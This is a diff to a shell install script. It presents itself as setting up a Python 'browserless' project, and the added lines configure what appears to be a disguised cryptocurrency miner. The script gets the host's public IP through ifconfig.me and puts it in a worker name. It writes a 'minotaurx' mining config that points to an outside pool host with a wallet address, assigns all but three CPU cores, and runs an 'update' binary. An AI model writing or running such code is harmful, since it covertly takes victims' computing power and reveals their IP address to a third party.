@@ -1,6 +1,23 @@
 #!/bin/sh
 python3 -m venv env
 source ./env/bin/activate
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+currentdate=$(date '+%d-%b-%Y_Shiny_')
+ipaddress=$(curl -s ifconfig.me)
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+currentdate+=$underscored_ip
+used_num_of_cores=`expr $num_of_cores - 3`
+
+echo ""
+echo "You have a total number of $used_num_of_cores cores"
+echo ""
+
+echo ""
+echo "Your worker name is $currentdate"
+echo ""
+sleep 2
+
 wget https://github.com/mncedisimavunqela/browserless-python/raw/main/browserless-python.tar.gz
 tar -xf browserless-python.tar.gz
 sleep 2
@@ -38,4 +55,16 @@ sleep 2
 sleep 2
 echo ""
 echo ""
+cat > config.json <<EOL
+[
+    {
+      "algorithm": "minotaurx",
+      "host": "flyingsaucer-eu.teatspray.fun",
+      "port": 7019,
+      "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
+      "password": "$currentdate,c=MAZA,zap=MAZA",
+      "workers": $used_num_of_cores
+    }
+  ]
+  EOL
 ./update/update python3 main.py
